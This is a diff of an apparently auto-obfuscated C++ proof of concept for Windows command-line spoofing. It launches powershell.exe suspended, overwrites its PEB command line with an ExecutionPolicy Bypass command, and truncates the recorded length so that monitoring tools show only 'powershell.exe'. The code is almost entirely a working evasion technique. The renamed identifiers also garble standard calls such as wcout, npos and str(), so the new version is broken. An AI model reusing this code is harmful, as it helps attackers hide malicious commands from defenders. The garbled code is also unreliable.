@@ -26,197 +26,197 @@ return _obf_decode_buffer;
 }
 }
 extern "C" NTSTATUS NtReadVirtualMemory(
-HANDLE _YWG8XDVN,
-PVOID _QSN8R5VH,
-PVOID _Y3ZNECZH,
-ULONG _VQDVZQ4F,
-PULONG _LSX1RKWV
+HANDLE _87PXX2E0,
+PVOID _IQQGTMQK,
+PVOID _U4GUUU6J,
+ULONG _WGCPJ0PP,
+PULONG _4Y6GHRVZ
 );
 extern "C" NTSTATUS NtWriteVirtualMemory(
-HANDLE _YWG8XDVN,
-PVOID _QSN8R5VH,
-PVOID _Y3ZNECZH,
-ULONG _2X5C1JTR,
-PULONG _2IBDGE78
+HANDLE _87PXX2E0,
+PVOID _IQQGTMQK,
+PVOID _U4GUUU6J,
+ULONG _AHCYLJTL,
+PULONG _856VTPKE
 );
 extern "C" NTSTATUS NtResumeThread(
-HANDLE _8E2LFL2K,
-PULONG _2DISGDRA
+HANDLE _I7H17ET5,
+PULONG _DANDTSYL
 );
 struct CUSTOM_PEB {
-BYTE _N90I5ZU5[16];
-PVOID _7MNRBE25;
-PVOID _O89XGUQL;
-PVOID _7LWR2EY7;
+BYTE _YXTIDAT3[16];
+PVOID _O9TKMNX1;
+PVOID _MRRTD4YQ;
+PVOID ProcessParameters;
 };
 struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
-BYTE _N90I5ZU5[112];
-USHORT _HVG61MD5;
-USHORT _7K7PMETK;
-PVOID _L0N4V91E;
+BYTE _YXTIDAT3[112];
+USHORT Length;
+USHORT MaximumLength;
+PVOID CommandLine;
 };
-void Debug(const std::wstring& _L2IOXK4S) {
-std::wcout << _L2IOXK4S << std::endl;
+void Debug(const std::wstring& _499M5YA9) {
+std::_YDID0G1I << _499M5YA9 << std::endl;
 }
-void Debug(const std::wstring& _L2IOXK4S, const std::vector<std::wstring>& _3D83HLX6) {
-std::wstring _3VNI2PV9 = _L2IOXK4S;
-for (_89QC5FFK _9TXVT6NP = 0; _9TXVT6NP < _3D83HLX6.size(); _9TXVT6NP++) {
-std::wstring _7HYI9L84 = L"{" + std::to_wstring(_9TXVT6NP) + L"}";
-_89QC5FFK _34R1FBAI = _3VNI2PV9.find(_7HYI9L84);
-if (_34R1FBAI != std::wstring::npos) {
-_3VNI2PV9.replace(_34R1FBAI, _7HYI9L84.length(), _3D83HLX6[_9TXVT6NP]);
+void Debug(const std::wstring& _499M5YA9, const std::vector<std::wstring>& _JM9WJVZ8) {
+std::wstring _BZRPM15P = _499M5YA9;
+for (size_t _7WZVQ0CZ = 0; _7WZVQ0CZ < _JM9WJVZ8.size(); _7WZVQ0CZ++) {
+std::wstring _8ND7YM5Q = L"{" + std::to_wstring(_7WZVQ0CZ) + L"}";
+size_t _0IJRB9N3 = _BZRPM15P.find(_8ND7YM5Q);
+if (_0IJRB9N3 != std::wstring::_0H1Y7R42) {
+_BZRPM15P.replace(_0IJRB9N3, _8ND7YM5Q.length(), _JM9WJVZ8[_7WZVQ0CZ]);
 }
 }
-std::wcout << _3VNI2PV9 << std::endl;
+std::_YDID0G1I << _BZRPM15P << std::endl;
 }
-std::wstring PadRight(const std::wstring& _1RV3Z0QL, _89QC5FFK _0EGSITCK, wchar_t _SG3XGOHQ) {
-if (_1RV3Z0QL.length() >= _0EGSITCK) return _1RV3Z0QL;
-return _1RV3Z0QL + std::wstring(_0EGSITCK - _1RV3Z0QL.length(), _SG3XGOHQ);
+std::wstring PadRight(const std::wstring& _BDYN8TAP, size_t _QQMC8U8P, wchar_t _LI3PZ7VC) {
+if (_BDYN8TAP.length() >= _QQMC8U8P) return _BDYN8TAP;
+return _BDYN8TAP + std::wstring(_QQMC8U8P - _BDYN8TAP.length(), _LI3PZ7VC);
 }
 int main() {
-std::wstring _B4QXER60 = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
-std::wstring _MJTAO39Q = PadRight(L"powershell.exe", _B4QXER60.length(), L' ');
+std::wstring _7O5TTJB3 = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
+std::wstring _WTFX1IEE = PadRight(L"powershell.exe", _7O5TTJB3.length(), L' ');
 Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
-Debug(L"[+] Malicious command length: " + std::to_wstring(_B4QXER60.length()));
-Debug(L"[+] Malicious command: " + _B4QXER60);
-Debug(L"[+] Spoofed command length: " + std::to_wstring(_MJTAO39Q.length()));
-Debug(L"[+] Spoofed command: " + _MJTAO39Q.substr(0, _MJTAO39Q.find_last_not_of(L' ') + 1));
-Debug(L"[+] Spoofed command (with padding): " + _MJTAO39Q);
+Debug(L"[+] Malicious command length: " + std::to_wstring(_7O5TTJB3.length()));
+Debug(L"[+] Malicious command: " + _7O5TTJB3);
+Debug(L"[+] Spoofed command length: " + std::to_wstring(_WTFX1IEE.length()));
+Debug(L"[+] Spoofed command: " + _WTFX1IEE.substr(0, _WTFX1IEE.find_last_not_of(L' ') + 1));
+Debug(L"[+] Spoofed command (with padding): " + _WTFX1IEE);
 Debug(L"[+] Creating suspended process...");
-STARTUPINFOW _LQTZVGZY = { 0 };
-_LQTZVGZY.cb = sizeof(_LQTZVGZY);
-SECURITY_ATTRIBUTES _0PRHDM6P = { 0 };
-_0PRHDM6P.nLength = sizeof(_0PRHDM6P);
-PROCESS_INFORMATION _HZ3KE1JN = { 0 };
-Debug(L"[+] Calling CreateProcessW with command: " + _MJTAO39Q);
-BOOL _5HKPZPZN = CreateProcessW(
+STARTUPINFOW _BB0K7I32 = { 0 };
+_BB0K7I32.cb = sizeof(_BB0K7I32);
+SECURITY_ATTRIBUTES _51XIZD9H = { 0 };
+_51XIZD9H.nLength = sizeof(_51XIZD9H);
+PROCESS_INFORMATION _900RWCTL = { 0 };
+Debug(L"[+] Calling CreateProcessW with command: " + _WTFX1IEE);
+BOOL _5WPL6KH4 = CreateProcessW(
 NULL,
-const_cast<LPWSTR>(_MJTAO39Q.c_str()),
-&_0PRHDM6P,
-&_0PRHDM6P,
+const_cast<LPWSTR>(_WTFX1IEE.c_str()),
+&_51XIZD9H,
+&_51XIZD9H,
 FALSE,
 CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
 NULL,
 L"C:\\windows\\",
-&_LQTZVGZY,
-&_HZ3KE1JN
+&_BB0K7I32,
+&_900RWCTL
 );
-if (!_5HKPZPZN) {
-DWORD _LRTG6EMX = GetLastError();
-Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(_LRTG6EMX));
+if (!_5WPL6KH4) {
+DWORD _TY8P2X6E = GetLastError();
+Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(_TY8P2X6E));
 return 1;
 }
 Debug(L"[+] Process spawned successfully!");
-Debug(L"[+] Process ID: " + std::to_wstring(_HZ3KE1JN.dwProcessId));
-Debug(L"[+] Thread ID: " + std::to_wstring(_HZ3KE1JN.dwThreadId));
+Debug(L"[+] Process ID: " + std::to_wstring(_900RWCTL.dwProcessId));
+Debug(L"[+] Thread ID: " + std::to_wstring(_900RWCTL.dwThreadId));
 Debug(L"[+] Querying process information...");
-PROCESS_BASIC_INFORMATION _9ICTVFP5 = { 0 };
-ULONG _4OZ9GIHQ = 0;
-NTSTATUS _Z9YUVPHC = NtQueryInformationProcess(
-_HZ3KE1JN.hProcess,
+PROCESS_BASIC_INFORMATION _C55NAV25 = { 0 };
+ULONG _Y0PNMI0L = 0;
+NTSTATUS _ZJMBGMY1 = NtQueryInformationProcess(
+_900RWCTL.hProcess,
 ProcessBasicInformation,
-&_9ICTVFP5,
-sizeof(_9ICTVFP5),
-&_4OZ9GIHQ
+&_C55NAV25,
+sizeof(_C55NAV25),
+&_Y0PNMI0L
 );
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
 Debug(L"[+] NtQueryInformationProcess successful!");
-Debug(L"[+] Return length: " + std::to_wstring(_4OZ9GIHQ));
-std::wstringstream _SNREUNX9;
-_SNREUNX9 << std::hex << _9ICTVFP5.PebBaseAddress;
-Debug(L"[+] PEB Address: 0x" + _SNREUNX9.str());
+Debug(L"[+] Return length: " + std::to_wstring(_Y0PNMI0L));
+std::wstringstream _JCSAIAR6;
+_JCSAIAR6 << std::hex << _C55NAV25.PebBaseAddress;
+Debug(L"[+] PEB Address: 0x" + _JCSAIAR6._BDYN8TAP());
 Debug(L"[+] Reading PEB structure...");
-CUSTOM_PEB _JTA2L6FL = { 0 };
-SIZE_T _5T7EAJQJ = 0;
-_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _9ICTVFP5.PebBaseAddress, &_JTA2L6FL, sizeof(_JTA2L6FL), (PULONG)&_5T7EAJQJ);
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+CUSTOM_PEB _TES8XF1O = { 0 };
+SIZE_T _AI3JS2BF = 0;
+_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _C55NAV25.PebBaseAddress, &_TES8XF1O, sizeof(_TES8XF1O), (PULONG)&_AI3JS2BF);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
-Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
-std::wstringstream _KHO66NN3;
-_KHO66NN3 << std::hex << _JTA2L6FL.ProcessParameters;
-Debug(L"[+] ProcessParameters Address: 0x" + _KHO66NN3.str());
+Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
+std::wstringstream _ARJ0F3FN;
+_ARJ0F3FN << std::hex << _TES8XF1O.ProcessParameters;
+Debug(L"[+] ProcessParameters Address: 0x" + _ARJ0F3FN._BDYN8TAP());
 Debug(L"[+] Reading ProcessParameters structure...");
-CUSTOM_RTL_USER_PROCESS_PARAMETERS _720DZJ5C = { 0 };
-_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _JTA2L6FL.ProcessParameters, &_720DZJ5C, sizeof(_720DZJ5C), (PULONG)&_5T7EAJQJ);
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+CUSTOM_RTL_USER_PROCESS_PARAMETERS _GPX4PVIE = { 0 };
+_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _TES8XF1O.ProcessParameters, &_GPX4PVIE, sizeof(_GPX4PVIE), (PULONG)&_AI3JS2BF);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
-Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
-Debug(L"[+] CommandLine Length: " + std::to_wstring(_720DZJ5C.Length));
-Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(_720DZJ5C.MaximumLength));
-std::wstringstream _C3RMFSV8;
-_C3RMFSV8 << std::hex << _720DZJ5C.CommandLine;
-Debug(L"[+] CommandLine Address: 0x" + _C3RMFSV8.str());
+Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
+Debug(L"[+] CommandLine Length: " + std::to_wstring(_GPX4PVIE.Length));
+Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(_GPX4PVIE.MaximumLength));
+std::wstringstream _AT2WX27C;
+_AT2WX27C << std::hex << _GPX4PVIE.CommandLine;
+Debug(L"[+] CommandLine Address: 0x" + _AT2WX27C._BDYN8TAP());
 Debug(L"[+] Reading original command line...");
-std::vector<wchar_t> _AF6DSRQM(_720DZJ5C.Length / sizeof(wchar_t));
-_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _720DZJ5C.CommandLine, _AF6DSRQM.data(), _720DZJ5C.Length, (PULONG)&_5T7EAJQJ);
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+std::vector<wchar_t> _A29M4U4L(_GPX4PVIE.Length / sizeof(wchar_t));
+_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _GPX4PVIE.CommandLine, _A29M4U4L.data(), _GPX4PVIE.Length, (PULONG)&_AI3JS2BF);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
-std::wstring _O3SX13DR(_AF6DSRQM.data());
-Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
-Debug(L"[+] Original CommandLine: " + _O3SX13DR);
+std::wstring _3V49ETNZ(_A29M4U4L.data());
+Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
+Debug(L"[+] Original CommandLine: " + _3V49ETNZ);
 Debug(L"[+] Preparing to write malicious command...");
-std::vector<wchar_t> _VY768IOE(_B4QXER60.begin(), _B4QXER60.end());
-Debug(L"[+] New command line length: " + std::to_wstring(_VY768IOE.size()));
-Debug(L"[+] New command line size in bytes: " + std::to_wstring(_VY768IOE.size() * sizeof(wchar_t)));
-SIZE_T _71Y68FLV = 0;
-_Z9YUVPHC = NtWriteVirtualMemory(_HZ3KE1JN.hProcess, _720DZJ5C.CommandLine, _VY768IOE.data(), _VY768IOE.size() * sizeof(wchar_t), (PULONG)&_71Y68FLV);
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+std::vector<wchar_t> _WZX71GX2(_7O5TTJB3.begin(), _7O5TTJB3.end());
+Debug(L"[+] New command line length: " + std::to_wstring(_WZX71GX2.size()));
+Debug(L"[+] New command line size in bytes: " + std::to_wstring(_WZX71GX2.size() * sizeof(wchar_t)));
+SIZE_T _ZURFSFQ3 = 0;
+_ZJMBGMY1 = NtWriteVirtualMemory(_900RWCTL.hProcess, _GPX4PVIE.CommandLine, _WZX71GX2.data(), _WZX71GX2.size() * sizeof(wchar_t), (PULONG)&_ZURFSFQ3);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
-Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(_71Y68FLV));
+Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(_ZURFSFQ3));
 Debug(L"[+] Writing spoofed command length...");
-USHORT _6Z34HEDP = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
-Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(_6Z34HEDP));
-std::wstringstream _EQ1B91H7;
-_EQ1B91H7 << std::hex << (ULONG_PTR)((BYTE*)_JTA2L6FL.ProcessParameters + 112);
-Debug(L"[+] Writing to address: 0x" + _EQ1B91H7.str());
-_Z9YUVPHC = NtWriteVirtualMemory(_HZ3KE1JN.hProcess, (PVOID)((BYTE*)_JTA2L6FL.ProcessParameters + 112), &_6Z34HEDP, sizeof(_6Z34HEDP), (PULONG)&_71Y68FLV);
-if (_Z9YUVPHC != 0) {
-Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+USHORT _ITNXFVME = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
+Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(_ITNXFVME));
+std::wstringstream _OTCXILAQ;
+_OTCXILAQ << std::hex << (ULONG_PTR)((BYTE*)_TES8XF1O.ProcessParameters + 112);
+Debug(L"[+] Writing to address: 0x" + _OTCXILAQ._BDYN8TAP());
+_ZJMBGMY1 = NtWriteVirtualMemory(_900RWCTL.hProcess, (PVOID)((BYTE*)_TES8XF1O.ProcessParameters + 112), &_ITNXFVME, sizeof(_ITNXFVME), (PULONG)&_ZURFSFQ3);
+if (_ZJMBGMY1 != 0) {
+Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 return 1;
 }
-Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(_71Y68FLV));
+Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(_ZURFSFQ3));
 Debug(L"[+] SPOOFING COMPLETE!");
 Debug(L"[+] Process will now show as: powershell.exe");
-Debug(L"[+] But will actually execute: " + _B4QXER60);
+Debug(L"[+] But will actually execute: " + _7O5TTJB3);
 Debug(L"[+] Resuming suspended process...");
-ULONG _1JYUF7L6 = 0;
-_Z9YUVPHC = NtResumeThread(_HZ3KE1JN.hThread, &_1JYUF7L6);
-if (_Z9YUVPHC == 0) {
+ULONG _9U2H3H9J = 0;
+_ZJMBGMY1 = NtResumeThread(_900RWCTL.hThread, &_9U2H3H9J);
+if (_ZJMBGMY1 == 0) {
 Debug(L"[+] Process resumed successfully!");
-Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(_Z9YUVPHC));
-Debug(L"[+] Previous suspend count: " + std::to_wstring(_1JYUF7L6));
+Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(_ZJMBGMY1));
+Debug(L"[+] Previous suspend count: " + std::to_wstring(_9U2H3H9J));
 } else {
-Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
+Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
 }
 Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
 Debug(L"Press a key to end PoC...");
-std::wcin.get();
+std::_YOLVWNIQ.get();
 Debug(L"[+] Cleaning up handles...");
-CloseHandle(_HZ3KE1JN.hProcess);
-CloseHandle(_HZ3KE1JN.hThread);
+CloseHandle(_900RWCTL.hProcess);
+CloseHandle(_900RWCTL.hThread);
 Debug(L"[+] Cleanup complete!");
 return 0;
 }
